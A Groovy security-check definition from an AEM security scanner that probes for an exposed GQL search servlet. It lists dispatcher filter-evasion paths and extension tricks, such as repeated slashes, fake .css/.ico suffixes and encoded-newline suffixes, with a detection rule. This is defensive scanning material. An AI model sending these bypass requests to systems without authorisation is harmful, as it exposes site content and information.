/*
 * (C) Copyright 2020 Netcentric - a Cognizant Digital Business
 *
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v10.html
 */
package dispatcher

import biz.netcentric.security.checkerdsl.payload.FilterEvasion

def check = HttpSecurityCheck.create {

    id "nc-XjJ15JKp"

    name "GQL Servlet exposed"

    vulnerability {
        name "Information Disclosure: ${name}"
        description '''Sensitive information might be exposed via AEM\\'s GQLServlet. Be aware that bypasses using image/* mimetype extensions e.g. *.ico may render in a browser as an image but if you rename the file with the ending *.txt you will see the output.'''
        remediation "Block the path through AEM dispatcher rules. Restrict access completly."
        cve "CWE-749"
        severity Severity.HIGH
    }

    categories 'dispatcher'

    steps([
            {
                name "GET to GQL Servlet using dispatcher bypasses"

                method "GET"

                paths {
                    ['/bin/wcm/search/gql.servlet', '/bin/wcm/search/gql',
                     '///bin///wcm///search///gql.servlet',
                     '///bin///wcm///search///gql']
                }

                extensions {
                    ["", ".json", ".1.json", ".json/.a.1.json", ".json/a.4.2.1...json",
                     ".json///.a.1.json", ".json///a.4.2.1...json",
                     ".json/a.css", ".json/a.js", ".json/a.html", ".json/a.ico", ".json/a.png",
                     ".json///a.css", ".json///a.js", ".json///a.html", ".json///a.ico", ".json///a.png",
                     ".json;%0aa.css", ".json;%0aa.html", ".json;%0aa.js", ".json;%0aa.png", ".json;%0aa.ico"]
                }

                parameters(["query": "type:base%20limit:..1", "pathPrefix":""])

                detect {
                    all {
                        checkStatusCode 200
                        bodyContains "hits"
                    }
                }
            }

    ])


}

check
